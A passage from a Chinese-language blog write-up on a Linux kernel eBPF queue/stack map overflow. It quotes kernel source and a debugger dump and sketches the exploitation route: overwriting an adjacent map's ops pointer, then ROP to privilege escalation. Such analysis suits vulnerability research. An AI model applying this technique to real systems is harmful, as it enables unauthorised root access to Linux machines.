BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (!value)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must increment bpf_prog_active to avoid kprobe+bpf triggering from</span></span><br><span class="line"><span class="comment"> * inside bpf map update or delete otherwise deadlocks are possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">preempt_disable();</span><br><span class="line">__this_cpu_inc(bpf_prog_active);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123;</span><br><span class="line">err = bpf_percpu_hash_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123;</span><br><span class="line">err = bpf_percpu_array_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123;</span><br><span class="line">err = bpf_percpu_cgroup_storage_update(<span class="built_in">map</span>, key, value,</span><br><span class="line">       attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_FD_ARRAY(<span class="built_in">map</span>)) &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = bpf_fd_array_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">   attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = bpf_fd_htab_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">  attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123;</span><br><span class="line"><span class="comment">/* rcu_read_lock() is not needed */</span></span><br><span class="line">err = bpf_fd_reuseport_array_update_elem(<span class="built_in">map</span>, key, value,</span><br><span class="line"> attr-&gt;flags);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, attr-&gt;flags);[<span class="number">8</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line">__this_cpu_dec(bpf_prog_active);</span><br><span class="line">preempt_enable();</span><br><span class="line">maybe_wait_bpf_programs(<span class="built_in">map</span>);</span><br><span class="line">out:</span><br><span class="line">free_value:</span><br><span class="line">kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 这时候 我们传入的 attr 中的 map_type 为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">map-&gt;map_type == BPF_MAP_TYPE_STACK</span><br></pre></td></tr></table></figure><p>那么我们就可以进入到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> = <span class="title">bpf_queue_stack</span>(<span class="title">map</span>);</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line"><span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment"> * map is full</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">err = -E2BIG;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line"><span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);  [<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcpy(dst, value, qs-&gt;map.value_size);</span><br></pre></td></tr></table></figure><p>就能发生溢出，而 qs 是可控的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;map.value_size];</span><br><span class="line">value &lt;- uvalue &lt;- u64_to_user_ptr(attr-&gt;value);</span><br></pre></td></tr></table></figure><p>这两个也可控的。如果size 大于 dst 的大小，就能造成溢出</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>cmd 命令的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_cmd &#123;</span><br><span class="line">BPF_MAP_CREATE,</span><br><span class="line">BPF_MAP_LOOKUP_ELEM,</span><br><span class="line">BPF_MAP_UPDATE_ELEM,</span><br><span class="line">BPF_MAP_DELETE_ELEM,</span><br><span class="line">BPF_MAP_GET_NEXT_KEY,</span><br><span class="line">BPF_PROG_LOAD,</span><br><span class="line">BPF_OBJ_PIN,</span><br><span class="line">BPF_OBJ_GET,</span><br><span class="line">BPF_PROG_ATTACH,</span><br><span class="line">BPF_PROG_DETACH,</span><br><span class="line">BPF_PROG_TEST_RUN,</span><br><span class="line">BPF_PROG_GET_NEXT_ID,</span><br><span class="line">BPF_MAP_GET_NEXT_ID,</span><br><span class="line">BPF_PROG_GET_FD_BY_ID,</span><br><span class="line">BPF_MAP_GET_FD_BY_ID,</span><br><span class="line">BPF_OBJ_GET_INFO_BY_FD,</span><br><span class="line">BPF_PROG_QUERY,</span><br><span class="line">BPF_RAW_TRACEPOINT_OPEN,</span><br><span class="line">BPF_BTF_LOAD,</span><br><span class="line">BPF_BTF_GET_FD_BY_ID,</span><br><span class="line">BPF_TASK_FD_QUERY,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后再看看  attr 所在的结构体是什么样子的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123;&#125;; <span class="comment">// 可见attr是一个union的结构体，会根据场景的不同，而选择不同的结构体</span></span><br></pre></td></tr></table></figure><p>根据场景可以看出attr是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">__u32map_type;<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">__u32key_size;<span class="comment">/* size of key in bytes */</span></span><br><span class="line">__u32value_size;<span class="comment">/* size of value in bytes */</span></span><br><span class="line">__u32max_entries;<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">__u32map_flags;<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment"> * flags defined above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u32inner_map_fd;<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">__u32numa_node;<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment"> * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">__u32map_ifindex;<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">__u32btf_fd;<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">__u32btf_key_type_id;<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">__u32btf_value_type_id;<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">&#125;;</span><br><span class="line">*******</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line"><span class="comment">//qs 是 bpf_queue_stack结构的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span>   <span class="comment">//bpf_map</span></span><br><span class="line"><span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">u32 head, tail;</span><br><span class="line">u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span><span class="comment">//   bpf_map_ops结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">enum</span> bpf_map_type map_type;</span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line">u32 pages;</span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="keyword">bool</span> unpriv_array;</span><br><span class="line"><span class="comment">/* 55 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="keyword">atomic_t</span> refcnt;</span><br><span class="line"><span class="keyword">atomic_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line"><span class="comment">/* funcs callable from userspace (via syscall) */</span></span><br><span class="line"><span class="keyword">int</span> (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *(*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *<span class="title">attr</span>);</span></span><br><span class="line"><span class="keyword">void</span> (*map_release)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file);</span><br><span class="line"><span class="keyword">void</span> (*map_free)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">int</span> (*map_get_next_key)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key);</span><br><span class="line"><span class="keyword">void</span> (*map_release_uref)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* funcs callable from userspace and from eBPF programs */</span></span><br><span class="line"><span class="keyword">void</span> *(*map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line"><span class="keyword">int</span> (*map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line"><span class="keyword">int</span> (*map_delete_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line"><span class="keyword">int</span> (*map_push_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line"><span class="keyword">int</span> (*map_pop_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"><span class="keyword">int</span> (*map_peek_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* funcs called by prog_array and perf_event_array map */</span></span><br><span class="line"><span class="keyword">void</span> *(*map_fd_get_ptr)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file,</span><br><span class="line"><span class="keyword">int</span> fd);</span><br><span class="line"><span class="keyword">void</span> (*map_fd_put_ptr)(<span class="keyword">void</span> *ptr);</span><br><span class="line">u32 (*map_gen_lookup)(struct bpf_map *<span class="built_in">map</span>, struct bpf_insn *insn_buf);</span><br><span class="line">u32 (*map_fd_sys_lookup_elem)(<span class="keyword">void</span> *ptr);</span><br><span class="line"><span class="keyword">void</span> (*map_seq_show_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span><br><span class="line">  struct seq_file *m);</span><br><span class="line"><span class="keyword">int</span> (*map_check_btf)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">     <span class="keyword">const</span> struct btf_type *key_type,</span><br><span class="line">     <span class="keyword">const</span> struct btf_type *value_type);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size = attr-&gt;max_entries + 1; [4]</span><br><span class="line">value_size = attr-&gt;value_size;[5]</span><br><span class="line">queue_size = sizeof(*qs) + (u64) value_size * size;[6]</span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);[7]</span><br></pre></td></tr></table></figure><p>attr-&gt;max_entries = -1,size = 0</p><p>所以申请下来的size就是一个bpf_queue_stack的大小</p><p>最后alloc最后返回的是 <code>return &amp;qs-&gt;map;</code></p><p>上面这些是alloc会用到结构体，那下面看下<code>map_update_elem</code> 会用到的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"><span class="comment">//这里用到的是 bpf_attr</span></span></span><br><span class="line"><span class="function"><span class="comment">//int ufd = attr-&gt;map_fd;这里可以看出用的是</span></span></span><br><span class="line"><span class="function">struct </span>&#123; <span class="comment">/* anonymous struct used by BPF_MAP_*_ELEM commands */</span></span><br><span class="line">__u32map_fd;</span><br><span class="line">__aligned_u64key;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">__aligned_u64 value;</span><br><span class="line">__aligned_u64 next_key;</span><br><span class="line">&#125;;</span><br><span class="line">__u64flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 而其中的 value</span></span><br><span class="line"><span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line"> <span class="comment">//转成了指针</span></span><br><span class="line">copy_from_user(value, uvalue, value_size);</span><br></pre></td></tr></table></figure><p>所以 可以通过 value来进行内容写入。</p><p>然后注意到 <code>bpf_map</code> 存储的是一个结构体，然后结构体里面有很多函数，如果能修改 <code>ops</code> 的值，那就可以进行rop，这个就有点像 tty_struct的利用。也是修改了堆风水里面的函数内存，然后栈转移，再执行rop，然后提权。</p><p>通过跟踪可以知道 qs 的size 是0x100 ，那么可以分配两个qs 然后 前一个覆盖后一个的struct bpf_map map</p><p>的最前一个 ops指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0xffff88807faaf400:0xffffffff82029ba00x0000000000000000</span><br><span class="line">0xffff88807faaf410:0xffff88807b5fdf000x0000000000000017</span><br><span class="line">0xffff88807faaf420:0xffffffff000000400x0000000100000000</span><br><span class="line">0xffff88807faaf430:0xffffffff000000010x0000000000000000</span><br><span class="line">0xffff88807faaf440:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf450:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf460:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf470:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf480:0xffff88807f4b77000x0000000100000001</span><br><span class="line">0xffff88807faaf490:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4a0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4c0:0x00000000000000010x0000000000000000</span><br><span class="line">0xffff88807faaf4d0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4e0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf4f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff88807faaf500:0xffff88807f9f9b000x0000000000000000</span><br><span class="line">0xffff88807faaf510:0xffff88807b6607c00xffff88807faaf518</span><br><span class="line">0xffff88807faaf520:0xffff88807faaf5180x0000000100000000</span><br><span class="line">0xffff88807faaf530:0x00000000000000000xffffffff82107d20</span><br><span class="line">0xffff88807faaf540:0x00000000000080fe0x0000000000000000</span><br><span class="line">0xffff88807faaf550:0x00000001000000400x0000000000000000</span><br><span class="line">0xffff88807faaf560:0x00000000000000000x0000000000000000</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0xffff88807faaf400 —▸ 0xffffffff82029ba0 —▸ 0xffffffff811aedd0 ◂—   0x8b1f74d2850c578b</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x40//size</span><br><span class="line"> RDI  0xffff88807faaf4d0 ◂— 0 //目的</span><br><span class="line"> RSI  0xffff88807fa97940 ◂— 1 //源</span><br></pre></td></tr></table></figure><p>最后 在 find_and_alloc_map 里面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">u32 type = attr-&gt;map_type;  <span class="comment">//**</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];<span class="comment">/**</span></span><br><span class="line"><span class="comment">if (!ops)</span></span><br><span class="line"><span class="comment">return ERR_PTR(-EINVAL);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if (ops-&gt;map_alloc_check) &#123;</span></span><br><span class="line"><span class="comment">err = ops-&gt;map_alloc_check(attr);</span></span><br><span class="line"><span class="comment">if (err)</span></span><br><span class="line"><span class="comment">return ERR_PTR(err);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if (attr-&gt;map_ifindex)</span></span><br><span class="line"><span class="comment">ops = &amp;bpf_map_offload_ops;</span></span><br><span class="line"><span class="comment">map = ops-&gt;map_alloc(attr);</span></span><br><span class="line"><span 